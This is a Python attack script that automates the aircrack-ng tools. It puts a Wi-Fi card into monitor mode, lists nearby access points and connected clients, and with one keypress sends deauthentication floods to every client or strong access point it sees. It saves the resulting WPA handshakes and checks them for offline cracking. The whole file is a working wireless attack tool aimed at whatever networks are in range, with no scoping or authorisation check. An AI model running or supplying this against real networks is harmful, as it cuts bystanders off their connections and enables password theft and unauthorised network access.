#!/usr/bin/env python3
import os, re, subprocess, time, threading, csv
from datetime import datetime
from colorama import Fore, Style, init
from resources.mac_vendors import MAC_VENDOR_PREFIXES
import sys, termios, tty, select

init(autoreset=True)

LOG_FILE = "wifi_ap.log"
HANDSHAKE_DIR = "handshakes"
REFRESH = 6
MON_IF = None

os.makedirs(HANDSHAKE_DIR, exist_ok=True)

def run_cmd(cmd, sudo=False):
    if sudo and os.geteuid() != 0:
        cmd = ['sudo'] + cmd
    return subprocess.check_output(cmd, encoding='utf-8', errors='ignore')

def select_interface():
    out = run_cmd(['iw', 'dev'])
    matches = re.findall(r'Interface\s+(\w+)', out)
    usable = [iface for iface in matches if 'wl' in iface]  # crude filter
    if not usable:
        print(Fore.RED + "[!] No usable wireless interfaces found.")
        exit(1)
    print("Available interfaces:")
    for i, name in enumerate(usable, 1):
        print(f"  [{i}] {name}")
    choice = int(input("Choose interface: ")) - 1
    return usable[choice]

def enable_monitor():
    global MON_IF
    iface = select_interface()

    try:
        # Enable monitor mode on chosen iface, no renaming assumption
        run_cmd(['airmon-ng', 'start', iface], sudo=True)
        # After enabling monitor, check which iface is monitor mode:
        out = run_cmd(['iw', 'dev'])
        mon_ifaces = []
        for mon_iface in re.findall(r'Interface\s+(\w+)', out):
            info = run_cmd(['iw', 'dev', mon_iface, 'info'])
            if 'type monitor' in info:
                mon_ifaces.append(mon_iface)
        if mon_ifaces:
            MON_IF = mon_ifaces[0]
        else:
            MON_IF = iface  # fallback
        print(Fore.GREEN + f"[*] Using monitor interface: {MON_IF}")
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"[!] Failed to enable monitor mode on {iface}")
        print(Fore.RED + f"    ↳ Error: {e}")
        exit(1)

def disable_monitor():
    if MON_IF:
        run_cmd(['airmon-ng', 'stop', MON_IF], sudo=True)

def start_airodump():
    return subprocess.Popen(['sudo','airodump-ng','--ignore-negative-one','--write-interval','1',
                             '--write','/tmp/apdump','--output-format','csv', MON_IF],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def parse_csv():
    try:
        lines = open('/tmp/apdump-01.csv', errors='ignore').read().splitlines()
    except:
        return {}

    aps, clients = {}, []
    section = 0
    for line in lines:
        if not line.strip():
            continue
        if 'BSSID' in line and 'Privacy' in line:
            section = 1
            continue
        elif 'Station MAC' in line:
            section = 2
            continue

        if section == 1:
            parts = [x.strip() for x in line.split(',')]
            if len(parts) < 14:
                continue
            bssid = parts[0]
            try:
                ch = int(parts[3])
                sig = int(parts[8])
            except ValueError:
                continue
            ssid = parts[13].strip()
            aps[bssid] = {'ssid': ssid, 'ch': ch, 'sig': sig, 'clients': [], 'handshake': False}
        elif section == 2:
            parts = [x.strip() for x in line.split(',')]
            if len(parts) >= 6:
                client_mac = parts[0]
                ap_mac = parts[5]
                clients.append({'mac': client_mac, 'ap': ap_mac})

    for c in clients:
        if c['ap'] in aps:
            aps[c['ap']]['clients'].append(c['mac'])

    return aps

def vendor(mac):
    p = mac.lower().replace('-',':')[:8]
    return MAC_VENDOR_PREFIXES.get(p, "Unknown")

def log_event(evt, bssid='', ssid='', mac='', vendor_name='', sig=0):
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(LOG_FILE, 'a+', encoding='utf-8') as f:
        f.write(f"{ts};{evt};{bssid};{ssid};{mac};{vendor_name};{sig}\n")

def deauth_and_capture(bssid, ssid, target_mac, channel):
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe = re.sub(r'\W+', '_', ssid or bssid)
    base = os.path.join(HANDSHAKE_DIR, f"{safe}_{timestamp}")
    cap = base + "-01.cap"
    run = subprocess.Popen([
        'airodump-ng', '--bssid', bssid, '-c', str(channel), '-w', base, MON_IF
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(3)
    subprocess.Popen(['aireplay-ng','--deauth','10','-a',bssid, *(['-c',target_mac] if target_mac else []), MON_IF])
    time.sleep(10)
    run.terminate()

    print(Fore.CYAN + f"[*] verifying {cap} ...", end=' ')
    res = subprocess.run(['aircrack-ng','-a2','-w','/dev/null',cap], stdout=subprocess.PIPE, text=True)
    ok = 'handshake' in res.stdout.lower()
    print((Fore.GREEN + "[OK]") if ok else (Fore.RED + "[NO]"))
    log_event('HANDSHAKE_' + ('SUCCESS' if ok else 'FAIL'), bssid, ssid, target_mac, vendor(target_mac), 0)
    return ok

def display(aps):
    os.system('clear')
    now = datetime.now().strftime("%H:%M:%S")
    print(Fore.CYAN + f"[ WIFI MONITOR {now} ]" + Style.RESET_ALL)

    print(f"{'SSID':<22} {'BSSID':<20} {'SIG':>5} {'CH':>3} {'#CL':>4} {'HS':>4}")
    print('-' * 70)

    for bssid, info in sorted(aps.items(), key=lambda x: x[1]['sig'], reverse=True):
        ssid = info['ssid'][:22].ljust(22)
        sig_val = info['sig']
        if sig_val >= 60:
            signal = Fore.GREEN + f"{sig_val}".rjust(5) + Style.RESET_ALL
        elif sig_val >= 40:
            signal = Fore.YELLOW + f"{sig_val}".rjust(5) + Style.RESET_ALL
        else:
            signal = Fore.RED + f"{sig_val}".rjust(5) + Style.RESET_ALL
        ch = str(info['ch']).rjust(3)
        num_clients = str(len(info['clients'])).rjust(4)
        hs_flag = Fore.GREEN + '[OK]' if info.get('handshake') else Fore.RED + '[--]'
        print(f"{ssid} {bssid:<20} {signal} {ch} {num_clients}  {hs_flag}")

        for mac in info['clients']:
            vend = vendor(mac)
            print(Fore.LIGHTBLACK_EX + f"    ↳ {mac:<17} ({vend})" + Style.RESET_ALL)

    print("\n" + Fore.YELLOW + "[h] deauth+capture selected clients   [H] strong APs   [q] quit" + Style.RESET_ALL)

def getch(timeout=0.1):
    fd = sys.stdin.fileno()
    old = termios.tcgetattr(fd)
    try:
        tty.setcbreak(fd)
        rlist, _, _ = select.select([fd], [], [], timeout)
        if rlist:
            return sys.stdin.read(1)
    finally:
        termios.tcsetattr(fd, termios.TCSADRAIN, old)
    return None

def input_listener(state):
    while state['running']:
        k = getch()
        if not k:
            continue
        k = k.lower()
        if k == 'q':
            state['running'] = False
        elif k == 'h':
            state['do_h'] = True
        elif k == 'H':
            state['do_H'] = True

def main():
    if not os.path.exists(LOG_FILE):
        open(LOG_FILE,'w').write("ts;evt;bssid;ssid;mac;vendor;signal\n")
    enable_monitor()
    time.sleep(3)  # Let interface settle
    proc = start_airodump()
    state = {'running': True, 'do_h': False, 'do_H': False}

    threading.Thread(target=input_listener, args=(state,), daemon=True).start()

    try:
        while state['running']:
            aps = parse_csv()
            display(aps)

            if state['do_h']:
                for bssid, info in aps.items():
                    for mac in info['clients']:
                        if deauth_and_capture(bssid, info['ssid'], mac, info['ch']):
                            aps[bssid]['handshake'] = True
                state['do_h'] = False

            if state['do_H']:
                for bssid, info in aps.items():
                    if info['sig'] >= 40:
                        if deauth_and_capture(bssid, info['ssid'], '', info['ch']):
                            aps[bssid]['handshake'] = True
                state['do_H'] = False

            time.sleep(REFRESH)

    except KeyboardInterrupt:
        pass
    finally:
        proc.terminate()
        disable_monitor()

if __name__ == "__main__":
    main()
